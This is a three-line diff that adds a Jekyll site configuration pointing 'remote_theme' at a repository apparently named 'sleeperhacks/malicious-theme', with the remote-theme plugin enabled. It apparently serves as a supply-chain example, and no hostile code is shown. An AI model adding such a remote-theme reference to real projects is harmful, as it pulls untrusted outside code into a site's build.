@@ -1,0 +1,3 @@
+remote_theme: sleeperhacks/malicious-theme
+plugins:
+  - jekyll-remote-theme
